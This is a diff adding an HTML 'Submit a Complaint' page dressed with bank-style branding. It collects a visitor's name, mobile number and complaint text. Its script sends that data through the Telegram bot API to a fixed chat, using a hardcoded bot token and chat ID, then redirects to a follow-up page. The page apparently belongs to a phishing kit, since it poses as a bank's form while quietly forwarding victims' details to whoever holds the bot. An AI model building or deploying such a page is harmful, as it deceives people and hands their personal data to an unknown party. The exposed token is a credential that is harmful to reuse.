@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Complaint Form</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      background: #f8fafa;
+    }
+    .header-img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      overflow: hidden;
+      padding: 20px;
+      position: relative;
+      z-index: 1;
+    }
+    input, textarea {
+      width: 100%;
+      margin: 10px 0;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      box-sizing: border-box;
+      font-size: 15px;
+    }
+    textarea {
+      resize: vertical;
+      height: 100px;
+    }
+    .btn {
+      background: linear-gradient(to right, #7ed6df, #55efc4);
+      color: #fff;
+      border: none;
+      width: 100%;
+      padding: 14px;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .footer-message {
+      text-align: center;
+      font-size: 14px;
+      padding: 10px;
+      color: #666;
+    }
+    .footer-message span {
+      color: #f57c7c;
+    }
+  </style>
+</head>
+<body>
+
+<img class="header-img" src="https://i.ibb.co/tM0Mn8CF/images-6.png" alt="Header Image">
+
+<div class="container">
+  <h2 style="text-align:center; color:#007b9f;">📩 Submit a Complaint</h2>
+
+  <input type="text" id="name" placeholder="Your Name">
+  <input type="text" id="mobile" placeholder="Mobile Number" maxlength="10">
+  <textarea id="message" placeholder="Write your complaint here..."></textarea>
+
+  <button class="btn" onclick="sendComplaint()">Submit Complaint</button>
+</div>
+
+<div class="footer-message">
+  Pay, Save, Borrow & Invest money <br>with a <span>single bank</span>
+</div>
+
+<script>
+  function sendComplaint() {
+    const name = document.getElementById('name').value.trim();
+    const mobile = document.getElementById('mobile').value.trim();
+    const messageText = document.getElementById('message').value.trim();
+
+    if (name === '' || mobile === '' || messageText === '') {
+      alert("Please fill all fields.");
+      return;
+    }
+
+    if (mobile.length !== 10 || isNaN(mobile)) {
+      alert("Enter a valid 10-digit mobile number.");
+      return;
+    }
+
+    const message = `🛑 New Complaint Received:\n\n👤 Name: ${name}\n📞 Mobile: ${mobile}\n📝 Message:\n${messageText}`;
+
+    const token = "7882249824:AAH_uilWT-fudDHjgyav97CGNR9XZHwh_5A";
+    const chatId = "6677946042";
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    fetch(url)
+      .then(() => {
+        // ✅ Redirect to thank you page after sending
+        window.location.href = "complain.html"; // <-- Change this to your real URL
+      })
+      .catch(() => {
+        alert("❌ Failed to send. Please try again.");
+      });
+  }
+</script>
+
+</body>
+</html>
